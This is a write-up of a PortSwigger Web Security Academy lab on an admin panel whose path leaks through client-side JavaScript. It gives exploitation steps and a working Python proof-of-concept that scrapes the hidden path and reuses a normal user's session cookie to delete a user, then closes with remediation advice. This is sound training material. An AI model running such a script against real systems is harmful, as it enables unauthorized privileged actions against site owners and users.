# Unprotected Admin Functionality with Unpredictable URL — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-07-26

## The Problem

The admin panel was hosted at a randomized, unguessable path (e.g. `/admin-i387re`) instead of a predictable one like `/admin`. This was meant to prevent attackers from simply guessing the URL.

However, the path was leaked in the page's own client-side JavaScript:

```javascript
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-i387re');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
```

Even though `isAdmin` is `false` for every normal user (so the `if` block never actually runs), the JavaScript **source code itself** — including the hardcoded admin path — is still sent to every visitor's browser. Anyone can view it via "View Page Source" or dev tools, with no need to actually be an admin.

## Discovery / Exploitation

1. Visit the page as a normal, logged-in (non-admin) user
2. View the page's JavaScript source and search for patterns like `/admin-`
3. Extract the leaked path (e.g. `/admin-i387re`)
4. Request that path directly, reusing the normal user's own session cookie
5. The server accepts the request and grants access, since it never actually checks whether the session belongs to a real admin — it only relied on the path being "unguessable"

## Impact

Any authenticated user — even with zero privileges — can reach and use full admin functionality (e.g. deleting other users) once they inspect the page source. This defeats the purpose of using a random URL entirely, since the URL isn't actually secret — it's shipped to every client.

## Proof of Concept (Python)

This script automates discovery and exploitation: it fetches the homepage, searches the raw page text (including `<script>` content) for the leaked `/admin-` path, extracts it, then reuses the current session cookie to access the admin panel and delete a user (`carlos`) — with no real admin privileges.

```python
import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(url):

    r = requests.get(url, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict().get('session')

    soup = BeautifulSoup(r.text, 'lxml')
    admin_instance = soup.find(string=re.compile(r"/admin-"))

    if admin_instance is None:
        print("(-) no hidden admin path found on the page")
        sys.exit()

    match = re.search(r"href', '(.*?)'", admin_instance)

    if match is None:
        print("(-) admin path pattern not found in matched text")
        sys.exit()

    admin_path = match.group(1)
    print("(+) found hidden admin path:", admin_path)

    cookies = {'session': session_cookie}
    delete_carlos_url = url + admin_path + '/delete?username=carlos'

    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(+) carlos user deleted")
    else:
        print("(-) deletion failed")
        print("(-) exiting script...")
        sys.exit()


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    print("(+) searching for hidden admin path...")
    delete_user(url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Requests the homepage and saves the normal session cookie
2. Parses the HTML with BeautifulSoup and searches raw text (not just tags) for `/admin-`, since the path is buried inside a `<script>` block, not a real `<a href>`
3. Uses a regex to pull just the path out of the matched JavaScript text
4. Reuses the normal session cookie against the discovered admin path to perform a privileged action (deleting `carlos`)

## Remediation

Using an unpredictable URL is not a substitute for real access control. The server must:
1. Verify the user is authenticated
2. Verify the user's role is explicitly `admin` — checked server-side, on every request to admin functionality

Client-side code (HTML, JavaScript, comments) sent to the browser must never be assumed to be private — anything shipped to the client can be read, even if wrapped in a condition that "shouldn't" trigger.

## Takeaway

- Hiding a resource behind an unguessable URL is "security through obscurity," not real access control
- Never trust the client: any check written in JavaScript is not a security boundary
- Real protection means server-side, per-request role verification — nothing else is sufficient
